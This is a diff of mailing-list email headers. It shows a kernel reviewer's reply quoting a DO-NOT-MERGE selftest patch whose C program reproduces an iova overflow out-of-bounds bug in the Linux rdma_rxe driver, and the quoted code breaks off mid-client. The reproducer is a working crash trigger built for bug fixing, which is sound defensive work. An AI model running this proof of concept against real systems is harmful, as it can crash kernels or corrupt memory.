@@ -1,243 +1,476 @@
-Received: from PH7PR06CU001.outbound.protection.outlook.com (mail-westus3azon11010022.outbound.protection.outlook.com [52.101.201.22])
+Received: from out-183.mta0.migadu.com (out-183.mta0.migadu.com [91.218.175.183])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 99B593C07A;
-	Sun,  2 Aug 2026 17:01:36 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.101.201.22
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785690098; cv=fail; b=SqyfRzfe6tD83eIZyFAopuhGaMse6SIZVGYOlIHyazHV7OvSuc+zQWk5xuji+LB/QEmxwgzpq9xwsUx/Dl6urqo5aATzbPMEFIht2h6urkzprRwruIc3OTUe5jdTrwx431PYJNPnPjKnh9GKzX1+phaTc8gvNufcfT7C+fECTVo=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785690098; c=relaxed/simple;
-	bh=O8TwODpxEnvgv8Zd6fShoepGiaxKrl0pfIdBmLhEpio=;
-	h=Message-ID:Date:Subject:To:Cc:References:From:In-Reply-To:
-	 Content-Type:MIME-Version; b=HWhMGvvGT8eya75l/BmrmzmZCPPGdgbXlenOk3RZNxVG3Er1KM8Y06RwWnC/mCRXjxWYm77gno4WXulEcEaq0EJQo3M/g/dvtrrRdz4bCuS58Yr7ZhyzvPXD1VZf5lXAjdNqjLeRWV+OS1JdwnPzCeoaFU1tHARq5vbCUo3alTw=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com; spf=fail smtp.mailfrom=nvidia.com; dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b=hXgcPyw6; arc=fail smtp.client-ip=52.101.201.22
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=nvidia.com
-Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=nvidia.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7C4D42931E0
+	for <linux-rdma@vger.kernel.org>; Sun,  2 Aug 2026 22:09:42 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=91.218.175.183
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1785708585; cv=none; b=a3t98DjczKkyJMy8pgOx6tchrYry7pDY3RWd2ax8QTLGYoy4FzwV7Z0KbBU+X1fMPdGqAesQafokxJ7RBg+kIdIAUJmoBd/ON1beEXpwsF4UJlbmkSf5aM2QMgkfcl5DcnT5I0Cn4rTB0p3N2RXuv7yFJ3IyMF/nUAIcN/DmD5A=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1785708585; c=relaxed/simple;
+	bh=69Frk5Kw6br8tLrsFK8rD6hGpcUgGAIl4MlmLlgtm9E=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=hw4BrxCu4papo5Bo9Be/0fDUnhfh8JTEAO91k/rb6D1rXS/czfoqKMDtcCf25BYGYwyd4lfibrTb39hnp+NPppq9hMbPdCFvX0/o8lP21JNip9odJZ2eZV/fiAmeuhaz9Sl4BQEF2wVOtUVw/p5tQTlrVRGP68FUnRh7EllKkcI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=eAtARnUR; arc=none smtp.client-ip=91.218.175.183
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=Nvidia.com header.i=@Nvidia.com header.b="hXgcPyw6"
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=Y+hXdI3GwvKG4iyLKuv8rDfutWRKbtnzoVew7BAJh8ocM/xKRT/woA+geqOMzN603XzHmJXIp2Pik83ou200LROKM7zKe53s2sJ4sQVzyRwwUMxLhZCi2DO/t+eMfHrRwjEMZzs7Q914K8GtcYtBt1tGpODp/7dZMu7xSbQFK4M4ej6BCmjeUTMezAAtM5E46fhcxg0GFsBBUafdiY+shoySRxPO8piVgSvs0o5D8+so96bMBNh0jSRFxRG7C6ZO7qMQvqcdmYuxyIKhYb4kVolS5f90XoVvPHbu+PhpkPfCvvSLiP/kIL5hJAmZZ9tMjfdivqsgOCVxmlvwjoRBkg==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=XsqlfI3pbKQ6j9uT6KtdNbzU/fndrzg8sOPpz1XddQ4=;
- b=Zz1nL28wgi+08AogBUtec2aabBw5kInunFytcyulD7wr7TzjhV3P77VeOtWUlV4NDIWZqBFL4XIPN9Qf4pnkoDWfpIeDMW/y6I3rsif81rljYn+Rvsb6p48t/C5+XG3bz+b5053fR1hJdvl8TpF3vJpQ/7XYpbLodEbI+9R6xsko5Wyyf32qoKN35LLwc+vdtLJECxpvzQ8CH/4icsFsNSSpDznpALZV+o8dMzaAMYqNdbCqQndEL8NToM6oJPq8MFCkZjrsrhxN2lhKj+K0DHZIlqBPMyPxeR5i7/zPLQNwv2r7kcBlbhsYHXOMfzfFV048AOiDnQSl49+2k7M+pw==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=nvidia.com; dmarc=pass action=none header.from=nvidia.com;
- dkim=pass header.d=nvidia.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=Nvidia.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=XsqlfI3pbKQ6j9uT6KtdNbzU/fndrzg8sOPpz1XddQ4=;
- b=hXgcPyw6tmH0QIp5HvvsGJxhsgHJrmAI7k5o6zec3mw7QVC5Lkd57IgIRkJ0psa6lviMdsL4MlrXnjSbqjHJ6JcNTELWPRjQvK7x07rxJP5ATIBOm4Lr0prgC+1MYHaVN86tsuKPB+SfqQonXvJungGp60l0vkzzwSpvgj9guxQZTR+sJ6dax2hhORdImAMIQRetJ48dPOFi30IrXBo1ZsuwlBQZVgcF2q2y1WQ4B6DAYbt6c7l7yZn/KEZBmwYFQTbs5A7nhYqNYdsTw/riSPXKXpQb6S9aIBObsIYmEuD3equ++kSWrqiR15ufzoHMPprU7A1C1Lfr9oxL/02Glw==
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=nvidia.com;
-Received: from DM4PR12MB9734.namprd12.prod.outlook.com (2603:10b6:8:225::23)
- by IA1PR12MB6017.namprd12.prod.outlook.com (2603:10b6:208:3d7::8) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.270.17; Sun, 2 Aug
- 2026 17:01:32 +0000
-Received: from DM4PR12MB9734.namprd12.prod.outlook.com
- ([fe80::ba44:51c5:b641:2917]) by DM4PR12MB9734.namprd12.prod.outlook.com
- ([fe80::ba44:51c5:b641:2917%6]) with mapi id 15.21.0270.016; Sun, 2 Aug 2026
- 17:01:32 +0000
-Message-ID: <2d0733d3-8181-4082-96db-02163698857c@nvidia.com>
-Date: Sun, 2 Aug 2026 20:01:24 +0300
-User-Agent: Mozilla Thunderbird Beta
-Subject: Re: [PATCH net] net/mlx5e: Move representor vnic reporter to eswitch
- devlink port
-To: Simon Horman <horms@kernel.org>, Tariq Toukan <tariqt@nvidia.com>
-Cc: Andrew Lunn <andrew+netdev@lunn.ch>, "David S. Miller"
- <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>,
- Jakub Kicinski <kuba@kernel.org>, netdev@vger.kernel.org,
- Paolo Abeni <pabeni@redhat.com>,
- Adithya Jayachandran <ajayachandra@nvidia.com>,
- Cosmin Ratiu <cratiu@nvidia.com>, Daniel Jurgens <danielj@nvidia.com>,
- Gal Pressman <gal@nvidia.com>, Jiri Pirko <jiri@resnulli.us>,
- Kees Cook <kees@kernel.org>, Leon Romanovsky <leon@kernel.org>,
- linux-kernel@vger.kernel.org, linux-rdma@vger.kernel.org,
- Maher Sanalla <msanalla@nvidia.com>, Mark Bloch <mbloch@nvidia.com>,
- Moshe Shemesh <moshe@nvidia.com>, Or Har-Toov <ohartoov@nvidia.com>,
- Parav Pandit <parav@nvidia.com>, Saeed Mahameed <saeedm@nvidia.com>,
- Shay Drori <shayd@nvidia.com>
-References: <20260729070059.2421788-1-tariqt@nvidia.com>
- <20260731165722.GK51943@horms.kernel.org>
-Content-Language: en-US
-From: Carolina Jubran <cjubran@nvidia.com>
-In-Reply-To: <20260731165722.GK51943@horms.kernel.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-ClientProxiedBy: FR2P281CA0154.DEUP281.PROD.OUTLOOK.COM
- (2603:10a6:d10:98::9) To DM4PR12MB9734.namprd12.prod.outlook.com
- (2603:10b6:8:225::23)
+	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="eAtARnUR"
+Message-ID: <c93089b8-bb9f-4aac-a644-36b6cc9b5d59@linux.dev>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linux.dev; s=key1;
+	t=1785708580;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references;
+	bh=LjqrgusSpJFX3bUbpKvCZsFqRjaa++ioa/tyKCMD89k=;
+	b=eAtARnURkUV0PojxyDbjcNvH4BBwqP/svlU608UNSKbXibwL2S96/uEIlUDWwIlRnpyfg0
+	St42prSKnwHFtrI4jBrrDBz6hloWKePpbNjypBac8xgTP1A5PCZlNniaoumY2Xl4XH8BsE
+	utUxS4xLUt4a/BqoFjVLb2eroFNmkFw=
+Date: Sun, 2 Aug 2026 15:09:34 -0700
 Precedence: bulk
 X-Mailing-List: linux-rdma@vger.kernel.org
 List-Id: <linux-rdma.vger.kernel.org>
 List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: DM4PR12MB9734:EE_|IA1PR12MB6017:EE_
-X-MS-Office365-Filtering-Correlation-Id: 5918b8db-fa98-4f7c-2345-08def0b7b3f8
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam:
-	BCL:0;ARA:13230040|23010399003|1800799024|366016|7416014|376014|22082099003|18002099003|11063799006|10067099003|56012099006|4143699003|5023799004;
-X-Microsoft-Antispam-Message-Info:
-	DkiDusFUnuXInNNQHw2gJoUfDjvqNk5YS5Gz85boSwlFAzwoYJ9LILLB0+ZUZv+HWKh4IccUaUFHcLGfhUfaIn/GhBsYM06t1wQwgFdcJi3grFd2zfZSVJSq0S3HuECXF0VB6kIA9D6yY+2kk5KziO+DlYf2VqPzFrMJzPP9pcaOqCbIoBG33x4fsA/6KYi2g/DlTfAo08EE7HBud2+d2hJ/xOlIspz/TBBkdoMfGg6YJfIBqXYgEc1JRGZkemaMKOo+jxlO2qWHeq63GiNMVNPWiX9zIRH2E6O6TZVyZKra2YnLqn6sqywv9QcenuRvztRbAI0i5z/9Sa9142CmO3kohg3kdbEmXkfUvuuLMpMyvHCm3bcyDojsK385zcX9760eK3h1fuz6O+ScOOqX+v4I3d9PtvV1PQjqkbVeADIHZo0AV3WfoU/kamVGAL7Nvm0A6THZ1qdnaLV00Lrvvln3dFB5upkaspK7U9jIDtobffPQVL4bK25MJMwGPXoaZ3nfT8y1nbD5RGKkcti1Hi1In/25DTdxgmu7cU2Q2MrjpfpoZqqz4Qhf7hfzTGa6yt6Nz8wZVtoRxtizNbifpy+JETl+ryFR0u1cxHquaXayGdEjNP86AgIpfPW5+o2Yp77Ugjzz+Y3IY75E2GGtFtvsUbEb/oyjUa7pFZWxDRY=
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DM4PR12MB9734.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(23010399003)(1800799024)(366016)(7416014)(376014)(22082099003)(18002099003)(11063799006)(10067099003)(56012099006)(4143699003)(5023799004);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?WkdoL2pQMGQ2TkdXZm5UTTBRSUhIclhlME1oczE4V3JhOG5kSlFVTkNRRWVX?=
- =?utf-8?B?OUE4bFNJOTVTS2c0NXgrZHZCdFo5YUVPQzBGNGgyc1IvUlZod0ZnUW1xMGxW?=
- =?utf-8?B?YkNlNnNSUUFNNkRSaVdQVjNsWmcwY243ZlRuTUJySHkzWUlnSnlPNGZzS3Yy?=
- =?utf-8?B?SGdZanRKVWNYbDNnQm5nTVFBMFJUdkJaYWZxMWNLd2NzUzE4aTRLVER1c1ps?=
- =?utf-8?B?dUZKUCtIb2FYdnZUUks0QXRMZWNuK005VkF5cFMzYzR5L1ordWU3dG5WZGFu?=
- =?utf-8?B?KzNsZmNISmpBVnhSVDU2REtqVnF2RjAvREUzamp6K0lFMkk2QzdaSndkMkNj?=
- =?utf-8?B?ME5jbmFNcDA0ZkpKRndRcHZwK2wwODJtZFVvSVNRczVndUQrcThVNXVJYXBs?=
- =?utf-8?B?aGcrNHI3bjlhSUR3VW5TV3RNOGs5bTd4VzhvL1cwQUsybHh0RU1jTWJkbXZk?=
- =?utf-8?B?eHdlbkNYNUhuU3MyRy9GWkJvQkNGbjVYUE9tdzFIYW5XcWRrWHczR3JBa3Jo?=
- =?utf-8?B?MXZEckJJbmhHOVFscXVaakJQUzNFOWI4NmgrZ0ZQbXpXTTZrNlNjbUM4MVkv?=
- =?utf-8?B?R0thbm5sVkkwOEFxNWxIenM5elpPc1BmdDVMbGhrZkdRaXFzTHJTM21TZ0dG?=
- =?utf-8?B?dWdYU3h2OUxURCtHMHRkeWdFMWdUMDV1Lzh0U0I3dWtjM0hRb0xpN0R4VTZG?=
- =?utf-8?B?Vm1HL2piWVZEN2hwdndIRG5aTTFMaUZJNFZlSXRzNGRxYlV5dUUwczlDYlpQ?=
- =?utf-8?B?WXNTcGlTSFlIMVZtclV2bUIvMnhOMy80aXhnNTgrSEtDL0N1anVFOXRJUlBl?=
- =?utf-8?B?MU00Z2JYQ3pNUWxtUlhieFZKMkxLMDRESnd4Q1hlRVhVREx1R1Y4Mi85aHh5?=
- =?utf-8?B?bWVBZ0tiR2RtcEg1N0dqSG42VU9vczNEMkozNVdIUUpabVVkTTdBQlJDWXdT?=
- =?utf-8?B?VFQxakNsa2Q0ekUvbUNza3J1VWt2SGhqOWZZSzRqL0JkSmFLTW5QTXBWZXlJ?=
- =?utf-8?B?dm1hYmEvUEdqcklkeFQxbHFOK3BkcUt6ZmlZR1ZzWkwrT1NWY1U2YmxBbjIx?=
- =?utf-8?B?S0YxdjlHMW9aa2hrQ1h5RVUrRElUYnNuWlp4Uk1WOEFPMGVWL0k1eXZaektJ?=
- =?utf-8?B?N2c4N0VINXJRSzBJbVBraTJQTHhRSHEzUXJsWlBKRFJFaGtnamo1eDhHQkN2?=
- =?utf-8?B?M2hYYkZacTh5S1BFRmZlS1N4Ukh1VVkyYzE5eFUwdjJDME9UTkwrUDlSUEpU?=
- =?utf-8?B?TENYQjRlb0ZpSDREM3F6bXRkMDUwcEhIejcwVGRvU3I5S2QrM1BEa0crckpn?=
- =?utf-8?B?VzEzS0RDQXhrWDVnZFAwVTJHWGRKRTVIOUtESGRqcWE0aHorRldxdzRQMjVG?=
- =?utf-8?B?UHZhbS9Oei8waVZLakRmdE52elBPbFVpeWVSODUzQ0ZJeFBXQmh1VkpRNzdy?=
- =?utf-8?B?cEtFcHlhdEU5WHJ4TlJtMVlPSWR2SW1iNkdVQkNicEFGaXVwVStDd01lSWZR?=
- =?utf-8?B?UnBWcTF5STQzYXMzYXFta0gzWGJNZTZpUHY2TTVMQVRZdGVDNWIrYjVzQS8z?=
- =?utf-8?B?RFlreG1NUTNRS0dINWRXNjQxWm5TMFgvbmt1UHJYcGVLT2wzSTk5V1EycVNJ?=
- =?utf-8?B?M1FjUTZzVGlOaUNXUnBEKytXcWtvZ1hES2lhaE5GZm1Nd1JGRExoTGN5ZW1n?=
- =?utf-8?B?NSt5SzM3enJWemEyTTUvSTNoRzk0MllWU2R0ai8xbjZhOEJxV3paRG8wcUUz?=
- =?utf-8?B?cExHWGRyK1lsdGc3eGVZTmVLUVhENm9aS0ltUGlCU1dOcWdWcGpta1dURjg1?=
- =?utf-8?B?ZGtQMGN0Vm4xTENnTlVRWEZjZm5mb1VFTUg2ZVljbXJ6K3kxOUZRR1VUS3dB?=
- =?utf-8?B?UGw4Ynp5TVpZTmkxdFAxNWZNaFJnd0hBYldYd3hjbFZLMkZIQzlwOTB6Q3dW?=
- =?utf-8?B?T1FOTDI1TUoyczJNZzJzS1dUM3FRSC8xc3A5S1FDeXV2TE9JSnIxSDFseWxN?=
- =?utf-8?B?VldGY1ZZclVVSjdnTi9qM2hSaVJwQzA1SUVxRWhRcHNNZTNNeGRuN1Q5Zi9z?=
- =?utf-8?B?emVVb0xIWm9zVVJkb1BmM2l0SHJOYjRtd0N3Z1ZaNEJMVno5RDUrTkpZcHJM?=
- =?utf-8?B?UzNFWUxDOUhockZEakVxK25EeGFZQzl1ZzVRVklFYTJKcUQ3aytnaEF5SkhL?=
- =?utf-8?B?eDFYUFN6d3pPYjJTblJNOEFuVUR0SGh4VEtpTUxhRDl5czFZaEFWaDk4MTg4?=
- =?utf-8?B?aUZEWDhybjB4T09Fell3ZnU2Zm5NYkw3alI4all6eWppOE1zWHFrTHdGdTFX?=
- =?utf-8?B?VE9tNnRIVEJZT0tJQTZGVW5IQTRacTU1clhsMnczK0FBeWhpRjYyZz09?=
-X-OriginatorOrg: Nvidia.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 5918b8db-fa98-4f7c-2345-08def0b7b3f8
-X-MS-Exchange-CrossTenant-AuthSource: DM4PR12MB9734.namprd12.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 02 Aug 2026 17:01:32.4450
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 43083d15-7273-40c1-b7db-39efd9ccc17a
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: wc91ziQpo3PVPe5Gjt0Z/BnyYYTARGzMwMoPCzpb3lKtUpqwwS4C9SKsKL661jE5xLC0JtjyKO/NYbJodSgeYw==
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: IA1PR12MB6017
+Subject: Re: [PATCH net 2/2] DO-NOT-MERGE: selftest: add rxe mr_check_range()
+ overflow reproducer
+To: Gang Yan <gang.yan@linux.dev>, zyjzyj2000@gmail.com,
+ "yanjun.zhu@linux.dev" <yanjun.zhu@linux.dev>
+Cc: linux-rdma@vger.kernel.org, Gang Yan <yangang@kylinos.cn>
+References: <20260728091128.9116-1-gang.yan@linux.dev>
+ <20260728091128.9116-3-gang.yan@linux.dev>
+X-Report-Abuse: Please report any abuse attempt to abuse@migadu.com and include these headers.
+From: Zhu Yanjun <yanjun.zhu@linux.dev>
+In-Reply-To: <20260728091128.9116-3-gang.yan@linux.dev>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+X-Migadu-Flow: FLOW_OUT
 
+在 2026/7/28 2:11, Gang Yan 写道:
+> From: Gang Yan <yangang@kylinos.cn>
+> 
+> This patch is for reproduce the OOB issue.
+> 
+> Requirements:
+> * Kernel built with ``CONFIG_INFINIBAND``, ``CONFIG_INFINIBAND_USER_ACCESS``
+>    and ``CONFIG_RDMA_RXE`` (=m is fine).
+> * ``rdma_rxe`` module loadable (``modprobe rdma_rxe``).
+> * Userspace headers/libs to build the helper: ``libibverbs-dev``,
+>    ``librdmacm-dev``.
+> * Root (the script builds a network namespace, a veth pair and two rxe
+>    devices).
+> 
+> BUILD and RUN:
+>      cd tools/testing/selftests/rdma
+>      make
+>      # as root:
+>      ./rxe_mr_overflow.sh
+> 
+> Expected results (Unpatched kernel (bug present) — FAIL):
+> The kernel log shows the index WARNING immediately followed by an OOB Oops
+> in the responder path::
+> 
+>      WARNING: CPU: N PID: ... at rxe_mr_iova_to_index+0x.../0x... [rdma_rxe]
+>      ...
+>      RIP: 0010:rxe_mr_iova_to_index+0x.../0x... [rdma_rxe]
+>      Call Trace:
+>       <TASK>
+>       rxe_mr_copy+0x.../0x... [rdma_rxe]
+>       rxe_receiver+0x.../0x... [rdma_rxe]
+>       do_work+0x.../0x... [rdma_rxe]
+>       ...
+>      Oops: general protection fault, probably for non-canonical address 0x...
+>      Workqueue: rxe_wq do_work [rdma_rxe]
+>      RIP: 0010:rxe_mr_copy+0x.../0x... [rdma_rxe]
+>      Call Trace:
+>       <TASK>
+>       rxe_mr_copy+0x.../0x... [rdma_rxe]
+>       rxe_receiver+0x.../0x... [rdma_rxe]
+>       do_work+0x.../0x... [rdma_rxe]
+> 
+> Assisted-by: Codex: GLM-5.2
+> Signed-off-by: Gang Yan <yangang@kylinos.cn>
+> ---
+>   tools/testing/selftests/rdma/Makefile         |   8 +-
+>   tools/testing/selftests/rdma/config           |   2 +
+>   .../testing/selftests/rdma/rxe_mr_overflow.c  | 187 ++++++++++++++++++
+>   .../testing/selftests/rdma/rxe_mr_overflow.sh | 132 +++++++++++++
+>   4 files changed, 328 insertions(+), 1 deletion(-)
+>   create mode 100644 tools/testing/selftests/rdma/rxe_mr_overflow.c
+>   create mode 100644 tools/testing/selftests/rdma/rxe_mr_overflow.sh
+> 
+> diff --git a/tools/testing/selftests/rdma/Makefile b/tools/testing/selftests/rdma/Makefile
+> index 07af7f15c1bf..effeb8121d41 100644
+> --- a/tools/testing/selftests/rdma/Makefile
+> +++ b/tools/testing/selftests/rdma/Makefile
+> @@ -1,8 +1,14 @@
+>   # SPDX-License-Identifier: GPL-2.0
+> -TEST_PROGS := rxe_rping_between_netns.sh \
+> +TEST_GEN_FILES := rxe_mr_overflow
+> +TEST_PROGS := rxe_mr_overflow.sh \
+> +		rxe_rping_between_netns.sh \
+>   		rxe_ipv6.sh \
+>   		rxe_socket_with_netns.sh \
+>   		rxe_test_NETDEV_UNREGISTER.sh \
+>   		rxe_sent_rcvd_bytes.sh
+>   
+>   include ../lib.mk
+> +
+> +# rxe_mr_overflow uses libibverbs / librdmacm
+> +$(OUTPUT)/rxe_mr_overflow: CFLAGS += -O2 -Wall
+> +$(OUTPUT)/rxe_mr_overflow: LDLIBS += -libverbs -lrdmacm
+> diff --git a/tools/testing/selftests/rdma/config b/tools/testing/selftests/rdma/config
+> index 4ffb814e253b..bc27ce3ec093 100644
+> --- a/tools/testing/selftests/rdma/config
+> +++ b/tools/testing/selftests/rdma/config
+> @@ -1,3 +1,5 @@
+>   CONFIG_TUN
+>   CONFIG_VETH
+>   CONFIG_RDMA_RXE
+> +CONFIG_INFINIBAND
+> +CONFIG_INFINIBAND_USER_ACCESS
+> diff --git a/tools/testing/selftests/rdma/rxe_mr_overflow.c b/tools/testing/selftests/rdma/rxe_mr_overflow.c
+> new file mode 100644
+> index 000000000000..ccad930533ac
+> --- /dev/null
+> +++ b/tools/testing/selftests/rdma/rxe_mr_overflow.c
+> @@ -0,0 +1,187 @@
+> +// SPDX-License-Identifier: GPL-2.0
+> +/*
+> + * rxe_mr_overflow.c - trigger mr_check_range() iova overflow (OOB)
+> + *
+> + * Companion to rxe_mr_overflow.sh. The server registers a USER/MEM_REG MR
+> + * and accepts an RDMA_CM connection, passing its rkey via private data. The
+> + * client posts a single RDMA-WRITE whose remote_addr is chosen so that
+> + * iova + length wraps to 0 in mr_check_range():
+> + *
+> + *     iova + length = 0xfffffffffffffff8 + 8 = 2^64 = 0
+> + *
+> + * On an *unpatched* kernel this bypasses mr_check_range(), and the responder
+> + * computes a huge index in rxe_mr_iova_to_index() (WARN_ON(idx >= nbuf)) and
+> + * dereferences mr->page_info[huge] -> out-of-bounds access / oops.
+> + *
+> + * On a *patched* kernel mr_check_range() rejects the crafted iova and the
+> + * client completion is IBV_WC_REM_ACCESS_ERR (remote access error).
+> + *
+> + * Build: see Makefile (needs libibverbs-dev / librdmacm-dev).
+> + */
+> +#include <stdio.h>
+> +#include <stdlib.h>
+> +#include <string.h>
+> +#include <unistd.h>
+> +#include <stdint.h>
+> +#include <arpa/inet.h>
+> +#include <infiniband/verbs.h>
+> +#include <rdma/rdma_cma.h>
+> +
+> +#define BAD_ADDR	0xfffffffffffffff8ULL	/* iova + WR_LEN wraps to 0 */
+> +#define WR_LEN		8
+> +#define MR_LEN		4096
+> +
+> +struct mr_info {
+> +	uint32_t rkey;
+> +	uint32_t pad;
+> +	uint64_t iova;
+> +} __attribute__((packed));
+> +
+> +static int wait_ev(struct rdma_event_channel *ec, struct rdma_cm_event **ev,
+> +		   enum rdma_cm_event_type want)
+> +{
+> +	while (rdma_get_cm_event(ec, ev) == 0) {
+> +		if ((*ev)->event != want) {
+> +			fprintf(stderr, "unexpected event %s (want %s)\n",
+> +				rdma_event_str((*ev)->event), rdma_event_str(want));
+> +			rdma_ack_cm_event(*ev);
+> +			return -1;
+> +		}
+> +		return 0;
+> +	}
+> +	perror("rdma_get_cm_event");
+> +	return -1;
+> +}
+> +
+> +static int run_server(const char *ip, int port)
+> +{
+> +	struct rdma_event_channel *ec = rdma_create_event_channel();
+> +	struct rdma_cm_id *lid;
+> +	struct rdma_cm_event *ev;
+> +
+> +	if (!ec) { perror("event_channel"); return 1; }
+> +	if (rdma_create_id(ec, &lid, NULL, RDMA_PS_TCP)) { perror("create_id"); return 1; }
+> +
+> +	struct sockaddr_in sin = {0};
+> +	sin.sin_family = AF_INET;
+> +	sin.sin_port = htons(port);
+> +	if (!inet_pton(AF_INET, ip, &sin.sin_addr)) { fprintf(stderr, "bad ip\n"); return 1; }
+> +
+> +	if (rdma_bind_addr(lid, (struct sockaddr *)&sin)) { perror("bind_addr"); return 1; }
+> +	if (rdma_listen(lid, 1)) { perror("listen"); return 1; }
+> +	printf("[server] listen %s:%d dev=%s\n", ip, port,
+> +		lid->verbs ? ibv_get_device_name(lid->verbs->device) : "?");
+> +	fflush(stdout);
+> +
+> +	if (wait_ev(ec, &ev, RDMA_CM_EVENT_CONNECT_REQUEST)) return 1;
+> +	struct rdma_cm_id *id = ev->id;
+> +
+> +	struct ibv_pd *pd = ibv_alloc_pd(id->verbs);
+> +	struct ibv_cq *cq = ibv_create_cq(id->verbs, 8, NULL, NULL, 0);
+> +	if (!pd || !cq) { perror("alloc_pd/create_cq"); return 1; }
+> +	void *buf = calloc(1, MR_LEN);
+> +	struct ibv_mr *mr = ibv_reg_mr(pd, buf, MR_LEN,
+> +		IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE);
+> +	if (!mr) { perror("reg_mr"); return 1; }
+> +
+> +	struct ibv_qp_init_attr qa = {0};
+> +	qa.send_cq = cq; qa.recv_cq = cq; qa.qp_type = IBV_QPT_RC;
+> +	qa.cap.max_send_wr = 4; qa.cap.max_recv_wr = 4;
+> +	qa.cap.max_send_sge = 2; qa.cap.max_recv_sge = 2;
+> +	if (rdma_create_qp(id, pd, &qa)) { perror("create_qp"); return 1; }
+> +
+> +	struct mr_info info = { .rkey = mr->rkey, .iova = (uint64_t)(uintptr_t)buf };
+> +	struct rdma_conn_param p = {0};
+> +	p.private_data = &info;
+> +	p.private_data_len = sizeof(info);
+> +	p.initiator_depth = 1;
+> +	p.responder_resources = 1;
+> +	if (rdma_accept(id, &p)) { perror("accept"); return 1; }
+> +	rdma_ack_cm_event(ev);
+> +	printf("[server] accepted rkey=%#x iova=%#llx; waiting for client write\n",
+> +		mr->rkey, (unsigned long long)info.iova);
+> +	fflush(stdout);
+> +
+> +	/* The OOB (if unpatched) fires here in the responder path. */
+> +	sleep(5);
+> +	return 0;
+> +}
+> +
+> +static int run_client(const char *ip, int port)
+> +{
+> +	struct rdma_event_channel *ec = rdma_create_event_channel();
+> +	struct rdma_cm_id *id;
+> +	struct rdma_cm_event *ev;
+> +
+> +	if (!ec) { perror("event_channel"); return 1; }
+> +	if (rdma_create_id(ec, &id, NULL, RDMA_PS_TCP)) { perror("create_id"); return 1; }
+> +
+> +	struct sockaddr_in sin = {0};
+> +	sin.sin_family = AF_INET; sin.sin_port = htons(port);
+> +	if (!inet_pton(AF_INET, ip, &sin.sin_addr)) { fprintf(stderr, "bad ip\n"); return 1; }
+> +
